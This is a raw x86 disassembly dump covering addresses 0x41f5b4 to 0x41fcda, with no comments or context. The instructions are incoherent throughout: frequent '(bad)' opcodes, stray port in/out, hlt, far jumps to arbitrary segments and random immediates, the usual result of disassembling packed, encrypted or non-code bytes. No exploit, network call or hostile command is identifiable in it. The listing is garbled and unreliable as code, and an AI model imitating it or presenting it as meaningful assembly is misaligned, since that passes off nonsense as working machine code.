  41f5b4:	lea    esp,[esp+edx*4+0x62]
  41f5b8:	int    0xca
  41f5ba:	jle    0x41f61e
  41f5bc:	sub    dl,BYTE PTR [ebp+esi*8+0x33]
  41f5c0:	mov    bh,BYTE PTR ds:0xa33ea8a2
  41f5c6:	les    edi,FWORD PTR [ebx]
  41f5c8:	(bad)  
  41f5c9:	jne    0x41f64a
  41f5cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5cc:	cmp    BYTE PTR [ebx],dl
  41f5ce:	pop    ecx
  41f5cf:	add    edx,DWORD PTR [ebp-0x34]
  41f5d2:	dec    eax
  41f5d3:	pushf  
  41f5d4:	mov    DWORD PTR [eax+ebp*2+0x8],ecx
  41f5d8:	mov    ebx,0x597e45b1
  41f5dd:	test   al,0xfe
  41f5df:	in     eax,dx
  41f5e0:	retf   
  41f5e1:	mov    bl,al
  41f5e3:	pop    esp
  41f5e4:	mov    cl,0x5a
  41f5e6:	es cwde 
  41f5e8:	sub    edi,DWORD PTR [eax+0x3f6387c8]
  41f5ee:	fld    st(5)
  41f5f0:	mov    esi,0xb3aa5c32
  41f5f5:	rol    BYTE PTR [ebp+0x71cc558b],1
  41f5fb:	clc    
  41f5fc:	push   esi
  41f5fd:	jno    0x41f5fc
  41f5ff:	pop    esi
  41f600:	dec    esp
  41f601:	jo     0x41f5d0
  41f603:	mov    eax,DWORD PTR [edx]
  41f605:	out    0x13,al
  41f607:	push   ebp
  41f608:	mov    ah,0x4b
  41f60a:	es ja  0x41f5bc
  41f60d:	inc    edx
  41f60e:	hlt    
  41f60f:	xchg   edx,eax
  41f610:	jge    0x41f654
  41f612:	lods   al,BYTE PTR ds:[esi]
  41f613:	(bad)  
  41f614:	pop    ebp
  41f615:	jecxz  0x41f67b
  41f617:	jecxz  0x41f659
  41f619:	sub    eax,0xb1255764
  41f61e:	pop    ss
  41f61f:	stos   DWORD PTR es:[edi],eax
  41f620:	leave  
  41f621:	xor    BYTE PTR [eax-0x54],ah
  41f624:	mov    dh,0x59
  41f626:	div    ah
  41f628:	push   esp
  41f629:	daa    
  41f62a:	sub    cl,BYTE PTR [edi+0x14]
  41f62d:	(bad)
  41f631:	jae    0x41f693
  41f633:	ror    DWORD PTR [ecx-0x41f9ebcc],cl
  41f639:	sbb    dl,al
  41f63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f63c:	stc    
  41f63d:	test   eax,0x456c4e99
  41f642:	pop    DWORD PTR [edx-0x6b4b9d1]
  41f648:	sbb    al,0x73
  41f64a:	into   
  41f64b:	add    DWORD PTR [ebp-0x52],eax
  41f64e:	dec    ebp
  41f64f:	xor    DWORD PTR [edx+0x22c8edb5],edx
  41f655:	aas    
  41f656:	sub    BYTE PTR [edx-0x3c45f87d],ch
  41f65c:	lods   eax,DWORD PTR ds:[esi]
  41f65d:	ret    0x51d4
  41f660:	xchg   edx,eax
  41f661:	loop   0x41f60d
  41f663:	push   0x6d
  41f665:	cmp    eax,0x94e38565
  41f66a:	push   cs
  41f66b:	sbb    al,BYTE PTR [eax+0x1e]
  41f66e:	jo     0x41f67d
  41f670:	jno    0x41f646
  41f672:	push   edx
  41f673:	addr16 push 0xffffffca
  41f676:	sbb    ch,al
  41f678:	je     0x41f6ed
  41f67a:	(bad)  
  41f67b:	push   ebx
  41f67c:	push   edx
  41f67d:	ins    DWORD PTR es:[edi],dx
  41f67e:	clc    
  41f67f:	cdq    
  41f680:	and    bl,BYTE PTR [ecx+0x5b292897]
  41f686:	daa    
  41f687:	fmul   st(2),st
  41f689:	add    ch,BYTE PTR [edx+0x7d]
  41f68c:	sahf   
  41f68d:	fistp  WORD PTR [ecx]
  41f68f:	mov    dh,0x71
  41f691:	pop    esp
  41f692:	cmp    eax,0x507d9d53
  41f697:	data16 cmp dh,bl
  41f69a:	cli    
  41f69b:	adc    BYTE PTR ds:0xff14291b,0xce
  41f6a2:	mov    esi,0x8f6c8e94
  41f6a7:	shr    DWORD PTR [esi-0x4a0bd6de],0xbd
  41f6ae:	fcom   QWORD PTR [edi+0x75]
  41f6b1:	add    esp,ebp
  41f6b3:	fstp   TBYTE PTR [ebx-0x665eb3f9]
  41f6b9:	dec    edx
  41f6ba:	jecxz  0x41f6e8
  41f6bc:	ds popa 
  41f6be:	cs es jo 0x41f686
  41f6c2:	dec    esi
  41f6c3:	out    dx,al
  41f6c4:	jmp    0x52a3:0x4e925d65
  41f6cb:	ins    DWORD PTR es:[edi],dx
  41f6cc:	retf   
  41f6cd:	jecxz  0x41f6df
  41f6cf:	out    dx,al
  41f6d0:	add    DWORD PTR [edi+0x6db937ab],edx
  41f6d6:	push   0x73
  41f6d8:	les    eax,FWORD PTR [eax]
  41f6da:	iret   
  41f6db:	std    
  41f6dc:	fcmovnu st,st(2)
  41f6de:	lahf   
  41f6df:	dec    esp
  41f6e0:	mov    ecx,0x3703dcdc
  41f6e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6e6:	jns    0x41f754
  41f6e8:	mov    edi,0xbb4a56e8
  41f6ed:	cli    
  41f6ee:	inc    eax
  41f6ef:	and    BYTE PTR [ecx+0x70],ch
  41f6f2:	jl     0x41f699
  41f6f4:	sbb    al,0x8a
  41f6f6:	jecxz  0x41f6e6
  41f6f8:	cli    
  41f6f9:	(bad)  
  41f6fa:	jecxz  0x41f734
  41f6fc:	mov    ch,0x1b
  41f6fe:	(bad)  
  41f6ff:	out    dx,eax
  41f700:	pop    ecx
  41f701:	dec    ebx
  41f702:	ret    
  41f703:	xchg   edi,eax
  41f704:	push   es
  41f705:	outs   dx,DWORD PTR ds:[esi]
  41f706:	mov    bl,0x5c
  41f708:	gs dec eax
  41f70a:	cmp    al,0x3a
  41f70c:	es call 0x5a5:0x30ce3c30
  41f714:	shl    DWORD PTR [ecx+0x781377b7],1
  41f71a:	int    0xd9
  41f71c:	mov    ds:0x2177e1e0,al
  41f721:	div    BYTE PTR [edx-0x67]
  41f724:	jp     0x41f748
  41f726:	sub    DWORD PTR [ecx+0x5],ebx
  41f729:	or     DWORD PTR [edi+0xf8f4ace],ebp
  41f72f:	pop    ds
  41f730:	enter  0x5f0b,0x2d
  41f734:	jmp    0x935ca970
  41f739:	lods   eax,DWORD PTR ds:[esi]
  41f73a:	std    
  41f73b:	das    
  41f73c:	add    eax,0x47247c4b
  41f741:	imul   ecx,DWORD PTR [esi+ecx*8],0xffffff83
  41f745:	(bad)  
  41f746:	mov    ah,0x68
  41f748:	jp     0x41f713
  41f74a:	inc    edi
  41f74b:	dec    esp
  41f74c:	push   eax
  41f74d:	hlt    
  41f74e:	push   ebp
  41f74f:	xchg   esp,eax
  41f750:	mov    dh,0x53
  41f752:	neg    DWORD PTR [ebx+0x4fa87b99]
  41f758:	pop    edi
  41f759:	cdq    
  41f75a:	and    ebx,DWORD PTR [edi+0x7b624f8c]
  41f760:	or     ch,dh
  41f762:	sahf   
  41f763:	mov    ecx,0xfccdbb71
  41f768:	add    dl,BYTE PTR [edi-0x36]
  41f76b:	jmp    0x688e9bdf
  41f770:	int    0x81
  41f772:	xor    BYTE PTR [ebx-0x2a0609fe],0xb9
  41f779:	mov    ebx,0xd20cb9c
  41f77e:	stos   DWORD PTR es:[edi],eax
  41f77f:	and    DWORD PTR [eax],0x77
  41f782:	mov    ah,BYTE PTR [edx]
  41f784:	mov    ds:0xf320da4b,eax
  41f789:	iret   
  41f78a:	mov    ecx,0x1cd89440
  41f78f:	mov    BYTE PTR [eax-0x580d2d3a],dl
  41f795:	cmp    al,0xc5
  41f797:	mov    edx,0xb12a822a
  41f79c:	jns    0x41f774
  41f79e:	fisttp WORD PTR [eax-0x61]
  41f7a1:	scas   eax,DWORD PTR es:[edi]
  41f7a2:	adc    BYTE PTR [esi],al
  41f7a4:	add    bh,ah
  41f7a6:	(bad)  
  41f7a7:	push   ebp
  41f7a8:	add    DWORD PTR [ecx+0x57b20a29],edx
  41f7ae:	dec    esi
  41f7af:	cmp    BYTE PTR [edi+0x35],dl
  41f7b2:	lea    esi,[ecx*1-0xc11889b]
  41f7b9:	pop    eax
  41f7ba:	inc    esi
  41f7bb:	ja     0x41f7b6
  41f7bd:	jg     0x41f786
  41f7bf:	hlt    
  41f7c0:	sbb    al,0xb0
  41f7c2:	ret    0xb79b
  41f7c5:	mov    ebx,0x4676f546
  41f7ca:	std    
  41f7cb:	jno    0x41f829
  41f7cd:	lds    ebx,FWORD PTR [ebp-0x196e982e]
  41f7d3:	jb     0x41f829
  41f7d5:	(bad)  
  41f7d6:	aas    
  41f7d7:	int3   
  41f7d8:	push   ds
  41f7d9:	jle    0x41f788
  41f7db:	rcl    BYTE PTR gs:[esi],1
  41f7de:	nop
  41f7df:	add    ebp,DWORD PTR [edx-0x72422a4e]
  41f7e5:	add    edi,esi
  41f7e7:	adc    DWORD PTR [esi+edi*1-0x3b37263e],esp
  41f7ee:	xchg   ebx,eax
  41f7ef:	xchg   esi,eax
  41f7f0:	mov    al,0xf6
  41f7f2:	pop    eax
  41f7f3:	mov    ebx,0x25a871
  41f7f8:	test   BYTE PTR [edx+ebx*8-0x3701f18a],0xe
  41f800:	mov    cl,0xba
  41f802:	and    al,0x4b
  41f804:	mov    eax,?
  41f806:	dec    esi
  41f807:	pop    esi
  41f808:	or     cl,ch
  41f80a:	push   eax
  41f80b:	mov    cl,0x9d
  41f80d:	cmp    edi,DWORD PTR [edi]
  41f80f:	and    BYTE PTR [ebx-0x44a63e20],ch
  41f815:	leave  
  41f816:	sbb    DWORD PTR [esi+0xd],0x58
  41f81a:	clc    
  41f81b:	(bad)  
  41f81c:	mov    esp,0x880d17e4
  41f821:	jns    0x41f867
  41f823:	push   esp
  41f824:	push   ebp
  41f825:	cmp    al,0xa1
  41f827:	pop    ds
  41f828:	jl     0x41f812
  41f82a:	lods   al,BYTE PTR ds:[esi]
  41f82b:	jns    0x41f7ed
  41f82d:	pop    eax
  41f82e:	shl    edx,0x3c
  41f831:	and    BYTE PTR [edi-0x79],al
  41f834:	sti    
  41f835:	push   0xe998c1f9
  41f83a:	fneni(8087 only) 
  41f83c:	push   esi
  41f83d:	nop
  41f83e:	jmp    DWORD PTR [edi+0x6]
  41f841:	or     BYTE PTR [esi],0x7
  41f844:	xchg   esp,eax
  41f845:	hlt    
  41f846:	loop   0x41f84a
  41f848:	mov    eax,ds:0xbdcf8002
  41f84d:	xchg   esp,eax
  41f84e:	call   0x4249b6c2
  41f853:	and    DWORD PTR [ecx+esi*8-0x2f],esp
  41f857:	mov    bl,0x1a
  41f859:	ja     0x41f808
  41f85b:	push   ecx
  41f85c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f85d:	xor    edx,DWORD PTR [eax-0x7cee53f]
  41f863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f864:	mov    esp,DWORD PTR [eax-0x5272c41f]
  41f86a:	popf   
  41f86b:	jb     0x41f8e1
  41f86d:	js     0x41f82d
  41f86f:	jb     0x41f83b
  41f871:	in     eax,0x72
  41f873:	mov    ?,WORD PTR [esi-0x793917df]
  41f879:	push   edx
  41f87a:	test   BYTE PTR [edx-0x31f4ce27],bh
  41f880:	clc    
  41f881:	lock enter 0xf652,0x52
  41f886:	hlt    
  41f887:	fcmovne st,st(3)
  41f889:	jne    0x41f8ac
  41f88b:	inc    DWORD PTR [esi+0x174e418a]
  41f891:	iret   
  41f892:	inc    ecx
  41f893:	aam    0x10
  41f895:	in     eax,0x2d
  41f897:	pop    ss
  41f898:	inc    esp
  41f899:	mov    ds:0xec69624f,eax
  41f89e:	mov    BYTE PTR [bx],bh
  41f8a1:	inc    ebp
  41f8a2:	jecxz  0x41f885
  41f8a4:	mov    esi,0x3eedd
  41f8a9:	ds jae 0x41f8c9
  41f8ac:	push   ebx
  41f8ad:	rcr    bh,cl
  41f8af:	mov    esi,0x3678907f
  41f8b4:	std    
  41f8b5:	mov    dl,0x9b
  41f8b7:	mov    BYTE PTR [edx],ch
  41f8b9:	js     0x41f846
  41f8bb:	adc    eax,0x1c558cd6
  41f8c0:	mov    BYTE PTR [ebp+0x48],ch
  41f8c3:	fs mov dl,0x82
  41f8c6:	jbe    0x41f8d9
  41f8c8:	outs   dx,BYTE PTR ds:[esi]
  41f8c9:	xchg   BYTE PTR [ebx+0x37],bl
  41f8cc:	das    
  41f8cd:	or     BYTE PTR [ecx+edi*4],0x77
  41f8d1:	pusha  
  41f8d2:	(bad)  
  41f8d3:	mov    eax,0xc6bc96b9
  41f8d8:	adc    eax,0xdd682c2d
  41f8dd:	pop    edx
  41f8de:	pushf  
  41f8df:	push   eax
  41f8e0:	sub    DWORD PTR [eax-0x134c2cd4],ebx
  41f8e6:	out    dx,eax
  41f8e7:	pop    ebx
  41f8e8:	retf   
  41f8e9:	dec    ecx
  41f8ea:	xchg   ebx,eax
  41f8eb:	int3   
  41f8ec:	shl    DWORD PTR [ecx-0x2b],0x2b
  41f8f0:	shl    BYTE PTR [ecx+0x58],1
  41f8f3:	pop    eax
  41f8f4:	mov    bl,0xc6
  41f8f6:	js     0x41f8f0
  41f8f8:	xchg   ebx,esp
  41f8fa:	cmp    edx,DWORD PTR [edi+0x19be498e]
  41f900:	mov    esi,0x7aa046f8
  41f905:	and    ebx,DWORD PTR [ebp-0x1c]
  41f908:	push   es
  41f909:	xchg   ecx,eax
  41f90a:	mov    edi,0xae63d0bb
  41f90f:	or     bl,BYTE PTR [edx+eiz*1+0x374af79d]
  41f916:	push   eax
  41f917:	add    edi,DWORD PTR [ebp-0x3f]
  41f91a:	xchg   ecx,eax
  41f91b:	lock mov ebp,0x600ad6c8
  41f921:	dec    esi
  41f922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f923:	mov    ebp,0xac19b736
  41f928:	mov    ah,0xdf
  41f92a:	sbb    cl,BYTE PTR [eax+eiz*4]
  41f92d:	daa    
  41f92e:	jmp    0x41f902
  41f930:	push   0xd8c8ed12
  41f935:	adc    eax,0xa32f9bd0
  41f93a:	push   ecx
  41f93b:	mov    bl,0xe
  41f93d:	shl    BYTE PTR [edx+0x42723a26],0x37
  41f944:	test   eax,0x4d0523c2
  41f949:	and    BYTE PTR ds:[ebp+0x3],al
  41f94d:	xlat   BYTE PTR ds:[ebx]
  41f94e:	(bad)  
  41f94f:	xor    dh,al
  41f951:	inc    ebp
  41f952:	imul   esi,ebx,0xffffff92
  41f955:	mov    ecx,0xb73d554f
  41f95a:	adc    dh,bh
  41f95c:	push   edi
  41f95d:	xor    al,0x16
  41f95f:	xlat   BYTE PTR ds:[ebx]
  41f960:	or     DWORD PTR [edx],esp
  41f962:	shl    BYTE PTR [esi],cl
  41f964:	out    dx,eax
  41f965:	and    ebp,edx
  41f967:	xchg   esp,eax
  41f968:	or     al,BYTE PTR [edx+0x7dc58a4]
  41f96e:	das    
  41f96f:	pop    es
  41f970:	out    dx,eax
  41f971:	fcomi  st,st(5)
  41f973:	jae    0x41f988
  41f975:	dec    edi
  41f976:	sub    esp,DWORD PTR [ebx]
  41f978:	sub    al,0x4d
  41f97a:	call   0x1900:0x43badd02
  41f981:	hlt    
  41f982:	aas    
  41f983:	xchg   edi,eax
  41f984:	add    BYTE PTR [edx],bl
  41f986:	loope  0x41f933
  41f988:	imul   edi,esp,0x49b3726f
  41f98e:	xor    ch,BYTE PTR [esi-0x6b115488]
  41f994:	addr16 popa 
  41f996:	cmp    DWORD PTR [esi],0xffffff88
  41f999:	push   ebx
  41f99a:	adc    ebp,DWORD PTR [ecx-0x473f2599]
  41f9a0:	xchg   edi,eax
  41f9a1:	push   esi
  41f9a2:	(bad)  
  41f9a4:	push   ecx
  41f9a5:	cwde   
  41f9a6:	xchg   DWORD PTR [esi+0x42014e5d],edx
  41f9ac:	leave  
  41f9ad:	popa   
  41f9ae:	pop    esi
  41f9af:	gs in  eax,0xa8
  41f9b2:	dec    ebp
  41f9b3:	push   ebp
  41f9b4:	cmc    
  41f9b5:	jg     0x41f978
  41f9b7:	xor    ecx,DWORD PTR [esi+0x2c]
  41f9ba:	mov    bl,0xcf
  41f9bc:	and    eax,0x73107016
  41f9c1:	icebp  
  41f9c2:	ds mov bh,0xa0
  41f9c5:	mov    bl,0x17
  41f9c7:	mov    DWORD PTR [eax],edi
  41f9c9:	mov    ds:0x24b8d3ec,al
  41f9ce:	mov    cl,0x2
  41f9d0:	in     al,0x7
  41f9d2:	dec    edi
  41f9d3:	fwait
  41f9d4:	sub    ecx,DWORD PTR [ebx+0x18]
  41f9d7:	xchg   edi,eax
  41f9d8:	(bad)  
  41f9d9:	std    
  41f9da:	out    0x14,eax
  41f9dc:	cwde   
  41f9dd:	ja     0x41f993
  41f9df:	in     al,0x6b
  41f9e1:	add    DWORD PTR [eax-0x52b9baa1],eax
  41f9e7:	sub    DWORD PTR [esi-0xb],esp
  41f9ea:	lds    edx,FWORD PTR [eax-0x27d7620a]
  41f9f0:	sbb    al,0xf2
  41f9f2:	in     al,0x43
  41f9f4:	pop    ecx
  41f9f5:	mov    WORD PTR [ebp-0x4f],gs
  41f9f8:	iret   
  41f9f9:	mov    ds:0x1a68da03,eax
  41f9fe:	xor    ecx,ebp
  41fa00:	and    ch,BYTE PTR ds:0xa8c23892
  41fa06:	or     BYTE PTR [esi],ch
  41fa08:	inc    edx
  41fa09:	out    dx,al
  41fa0a:	jns    0x41fa0a
  41fa0c:	and    dl,bh
  41fa0e:	mov    ds:0x18ce454a,al
  41fa13:	and    ebp,DWORD PTR [edi+0x624ad163]
  41fa19:	cdq    
  41fa1a:	push   eax
  41fa1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa1c:	xchg   ebx,eax
  41fa1d:	fwait
  41fa1e:	test   al,0x8f
  41fa20:	sbb    eax,0x490d4799
  41fa25:	push   ss
  41fa26:	sub    cl,cl
  41fa28:	push   ss
  41fa29:	adc    eax,0x4595172e
  41fa2e:	pop    es
  41fa2f:	inc    esi
  41fa30:	xchg   edx,eax
  41fa31:	jmp    0x41fa25
  41fa33:	add    ebp,DWORD PTR [eax-0x48237feb]
  41fa39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa3a:	sbb    eax,0xfe2a4c41
  41fa40:	xchg   DWORD PTR [ebp-0x4c646057],edi
  41fa46:	bound  ecx,QWORD PTR [edx+0x2b19c50d]
  41fa4c:	jne    0x41fa4e
  41fa4e:	inc    ebx
  41fa4f:	pop    edx
  41fa50:	mov    esp,0x8bce3f1b
  41fa55:	pop    esp
  41fa56:	push   esp
  41fa57:	loop   0x41fa3d
  41fa59:	mov    ds:0xd6a68911,eax
  41fa5e:	and    ebx,DWORD PTR [ecx+0x27]
  41fa61:	addr16 and al,0x55
  41fa64:	(bad)  
  41fa65:	mov    dl,0x68
  41fa67:	sub    eax,0x8566bae3
  41fa6c:	pop    ebp
  41fa6d:	das    
  41fa6e:	pop    ds
  41fa6f:	xor    ebp,DWORD PTR [edx+eiz*4-0x1a]
  41fa73:	sbb    eax,0xd7abfe0a
  41fa78:	pusha  
  41fa79:	cld    
  41fa7a:	xchg   BYTE PTR [edx-0x30],ch
  41fa7d:	mov    dl,0x35
  41fa7f:	and    al,0x3
  41fa81:	in     al,0x23
  41fa83:	retf   
  41fa84:	push   ss
  41fa85:	mov    edx,es
  41fa87:	aad    0x3f
  41fa89:	sbb    cl,BYTE PTR [ecx+edi*8-0x2399c838]
  41fa90:	fxch   st(2)
  41fa92:	test   BYTE PTR [esi+eax*4+0x2a],0x20
  41fa97:	cmc    
  41fa98:	sbb    al,bl
  41fa9a:	stos   BYTE PTR es:[edi],al
  41fa9b:	cdq    
  41fa9c:	ins    DWORD PTR es:[edi],dx
  41fa9d:	fidiv  WORD PTR [esi+0xe3f2c0b]
  41faa3:	retf   
  41faa4:	ins    DWORD PTR es:[edi],dx
  41faa5:	in     eax,dx
  41faa6:	fsubr  DWORD PTR [edi]
  41faa8:	mov    BYTE PTR [edx],cl
  41faaa:	pop    edx
  41faab:	cmp    al,0x1
  41faad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faae:	dec    ecx
  41faaf:	mov    ah,dh
  41fab1:	dec    edx
  41fab2:	xlat   BYTE PTR ds:[ebx]
  41fab3:	int    0xc8
  41fab5:	jne    0x41fa48
  41fab7:	aaa    
  41fab8:	call   0x9db2b617
  41fabd:	loop   0x41fabc
  41fabf:	xchg   ecx,eax
  41fac0:	loopne 0x41fb2c
  41fac2:	call   0x5e66:0xcead4b9f
  41fac9:	ins    DWORD PTR es:[edi],dx
  41faca:	cmp    ch,BYTE PTR [edi-0xf]
  41facd:	pop    ebp
  41face:	push   cs
  41facf:	xchg   edx,eax
  41fad0:	push   ecx
  41fad1:	xchg   edi,esi
  41fad3:	cmp    al,0x2a
  41fad5:	adc    al,0x2b
  41fad7:	xchg   edx,eax
  41fad8:	sub    al,0x94
  41fada:	xchg   DWORD PTR [eax+0x23],ebp
  41fadd:	cli    
  41fade:	sbb    BYTE PTR [eax],al
  41fae0:	xor    al,0x55
  41fae2:	rol    DWORD PTR [ebp+edx*4+0x52],0x1e
  41fae7:	jmp    0xf6b7d007
  41faec:	push   esp
  41faed:	je     0x41faa2
  41faef:	mov    cl,0x87
  41faf1:	mov    eax,0xa33b736d
  41faf6:	test   DWORD PTR [ebx+ecx*4],edi
  41faf9:	das    
  41fafa:	adc    BYTE PTR [esi+eax*1-0xe],dl
  41fafe:	repnz test DWORD PTR [ebx],eax
  41fb01:	aad    0xc5
  41fb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb04:	pushf  
  41fb05:	mov    DWORD PTR [edi-0x39d1ef93],ebx
  41fb0b:	jp     0x41fb71
  41fb0d:	mov    edx,0x7223805c
  41fb12:	lds    eax,FWORD PTR [esi+0x3e]
  41fb15:	arpl   WORD PTR [esi+0x75],si
  41fb18:	mov    dh,0x4a
  41fb1a:	cli    
  41fb1b:	std    
  41fb1c:	in     eax,0xa5
  41fb1e:	mov    al,dl
  41fb20:	shl    BYTE PTR [eax-0x167ff54c],1
  41fb26:	(bad)  
  41fb27:	setno  ch
  41fb2a:	pop    ds
  41fb2b:	mov    edi,0x57da6672
  41fb30:	xchg   ecx,eax
  41fb31:	icebp  
  41fb32:	ficom  DWORD PTR [edi+0x73ea0f1d]
  41fb38:	sub    al,0x56
  41fb3a:	out    dx,al
  41fb3b:	fwait
  41fb3c:	lds    edi,FWORD PTR [ecx-0x72c3dde0]
  41fb42:	add    DWORD PTR [eax+0x23],0xe7ca8cfe
  41fb49:	dec    ebx
  41fb4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb4b:	scas   eax,DWORD PTR es:[edi]
  41fb4c:	scas   eax,DWORD PTR es:[edi]
  41fb4d:	and    ebp,eax
  41fb4f:	imul   ebx,DWORD PTR [esi+0x5b],0xccd9fb1e
  41fb56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb57:	lock mov ebp,0x3cd0f02b
  41fb5d:	ror    bh,1
  41fb5f:	jmp    0xa303f076
  41fb64:	add    eax,DWORD PTR [edi+0x2fe5d1a2]
  41fb6a:	repnz out dx,eax
  41fb6c:	into   
  41fb6d:	or     esp,eax
  41fb6f:	mov    cl,0x1d
  41fb71:	xchg   esi,eax
  41fb72:	iret   
  41fb73:	loop   0x41fb95
  41fb75:	sub    ebp,DWORD PTR [ecx+0xa]
  41fb78:	add    eax,0xcba1b4bc
  41fb7d:	and    edx,ebx
  41fb7f:	test   al,0x58
  41fb81:	test   DWORD PTR [ebp+0x6d],ebx
  41fb84:	mov    WORD PTR ds:0x9634c2dc,?
  41fb8a:	ins    DWORD PTR es:[edi],dx
  41fb8b:	stos   BYTE PTR es:[edi],al
  41fb8c:	pop    ebp
  41fb8d:	rcr    BYTE PTR [edx+0x36bf8a4d],cl
  41fb93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb94:	mov    al,0xb6
  41fb96:	cdq    
  41fb97:	(bad)  
  41fb98:	dec    esi
  41fb99:	and    ecx,DWORD PTR [ebp+0x2e]
  41fb9c:	add    al,0x0
  41fb9e:	jno    0x41fbd4
  41fba0:	adc    ah,BYTE PTR [edi+0x4df1b03a]
  41fba6:	xor    edx,DWORD PTR [ebx]
  41fba8:	in     eax,dx
  41fba9:	xor    al,0x6c
  41fbab:	scas   eax,DWORD PTR es:[edi]
  41fbac:	loop   0x41fbc9
  41fbae:	stc    
  41fbaf:	xor    eax,0xc6f5be48
  41fbb4:	jp     0x41fbb5
  41fbb6:	adc    cl,BYTE PTR [edx-0x462e69f5]
  41fbbc:	mov    bl,0x16
  41fbbe:	das    
  41fbbf:	ret    0xf247
  41fbc2:	repnz stos DWORD PTR es:[edi],eax
  41fbc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbc5:	push   esp
  41fbc6:	lods   eax,DWORD PTR ds:[esi]
  41fbc7:	(bad)  
  41fbc9:	jmp    0x7cf8:0x94a1bd07
  41fbd0:	mov    edx,0x5fc07df4
  41fbd5:	fistp  DWORD PTR [esi]
  41fbd7:	mov    ds:0x9adbbf05,eax
  41fbdc:	outs   dx,DWORD PTR ds:[esi]
  41fbdd:	fsubp  st(0),st
  41fbdf:	inc    ecx
  41fbe0:	mov    al,ds:0x12ce3972
  41fbe5:	jb     0x41fbbf
  41fbe7:	test   edx,edx
  41fbe9:	jg     0x41fc61
  41fbeb:	push   esp
  41fbec:	dec    edx
  41fbed:	mov    esp,ebx
  41fbef:	add    esi,ebx
  41fbf1:	addr16 xchg ecx,eax
  41fbf3:	jmp    0x80f207d1
  41fbf8:	add    al,0x7d
  41fbfa:	lock sbb ch,BYTE PTR [ecx-0x3dc468c8]
  41fc01:	or     ah,bl
  41fc03:	(bad)  
  41fc04:	mov    dl,0xa7
  41fc06:	sub    esp,DWORD PTR [edx+0x414b43d6]
  41fc0c:	mov    WORD PTR [ebp+0x1a],cs
  41fc0f:	push   es
  41fc10:	jnp    0x41fc43
  41fc12:	jg     0x41fc29
  41fc14:	ss inc edx
  41fc16:	mov    edi,0xf40fcaa7
  41fc1b:	call   0x1ac59074
  41fc20:	shl    BYTE PTR [bp+si+0x54b7],0xaa
  41fc26:	push   edx
  41fc27:	stos   DWORD PTR es:[edi],eax
  41fc28:	popf   
  41fc29:	jp     0x41fc28
  41fc2b:	pop    esi
  41fc2c:	sbb    al,0x83
  41fc2e:	js     0x41fbd9
  41fc30:	in     al,0x2d
  41fc32:	outs   dx,DWORD PTR ds:[esi]
  41fc33:	cmp    al,dh
  41fc35:	mov    WORD PTR [ebx],ss
  41fc37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc38:	repz test al,0x49
  41fc3b:	inc    eax
  41fc3c:	enter  0xd1e0,0x54
  41fc40:	and    bl,al
  41fc42:	adc    al,0x19
  41fc44:	sahf   
  41fc45:	ins    DWORD PTR es:[edi],dx
  41fc46:	push   ss
  41fc47:	mov    bh,0xcd
  41fc49:	mov    ebp,0x2feaf5b7
  41fc4e:	pushf  
  41fc4f:	sbb    eax,eax
  41fc51:	cwde   
  41fc52:	xlat   BYTE PTR ds:[ebx]
  41fc53:	push   es
  41fc54:	and    al,0xcb
  41fc56:	ins    BYTE PTR es:[edi],dx
  41fc57:	iret   
  41fc58:	scas   al,BYTE PTR es:[edi]
  41fc59:	mov    al,ds:0xc681ab80
  41fc5e:	fstp   DWORD PTR [eax+0xedd50a4]
  41fc64:	les    esp,FWORD PTR [esi-0x1a]
  41fc67:	bound  ecx,QWORD PTR [eax]
  41fc69:	dec    esp
  41fc6a:	xchg   edx,eax
  41fc6b:	shr    BYTE PTR [ebx+0x33],cl
  41fc6e:	ret    0xc0ce
  41fc71:	lods   al,BYTE PTR ds:[esi]
  41fc72:	xor    al,0x73
  41fc74:	xchg   ebp,eax
  41fc75:	pandn  mm5,QWORD PTR [ebp-0x5a]
  41fc79:	and    al,0x7c
  41fc7b:	loope  0x41fce8
  41fc7d:	aaa    
  41fc7e:	rcr    BYTE PTR [eax+0x55],0x89
  41fc82:	nop
  41fc83:	aaa    
  41fc84:	sbb    BYTE PTR [ecx+esi*8],al
  41fc87:	daa    
  41fc88:	xchg   DWORD PTR [edi-0x678b07ca],edi
  41fc8e:	gs dec edx
  41fc90:	mov    eax,0x75b1bf4e
  41fc95:	lods   eax,DWORD PTR ds:[esi]
  41fc96:	xchg   DWORD PTR [edi+ebx*8],ebx
  41fc99:	sbb    DWORD PTR [ecx-0x16],ebp
  41fc9c:	sub    ebx,DWORD PTR [eax]
  41fc9e:	jg     0x41fce8
  41fca0:	popa   
  41fca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca2:	inc    edi
  41fca3:	std    
  41fca4:	jns    0x41fc90
  41fca6:	xchg   esp,eax
  41fca7:	cmp    DWORD PTR [ebp-0x38],edx
  41fcaa:	dec    ebp
  41fcab:	jle    0x41fc7b
  41fcad:	sub    BYTE PTR [edi],ch
  41fcaf:	add    eax,0xa1832c38
  41fcb4:	imul   eax,DWORD PTR [esi],0xffffffec
  41fcb7:	(bad)  
  41fcb8:	out    0x13,eax
  41fcba:	leave  
  41fcbb:	mul    BYTE PTR [ebp+0x18f780d9]
  41fcc1:	sub    al,0x25
  41fcc3:	imul   DWORD PTR [eax-0x2f44fc21]
  41fcc9:	out    dx,eax
  41fcca:	or     BYTE PTR [ebx],0x39
  41fccd:	mov    al,0x7d
  41fccf:	push   ss
  41fcd0:	pop    eax
  41fcd1:	int3   
  41fcd2:	mov    edi,0x29e1205
  41fcd7:	xchg   edi,eax
  41fcd8:	in     eax,0xef
  41fcda:	outs   dx,DWORD PTR ds:[esi]
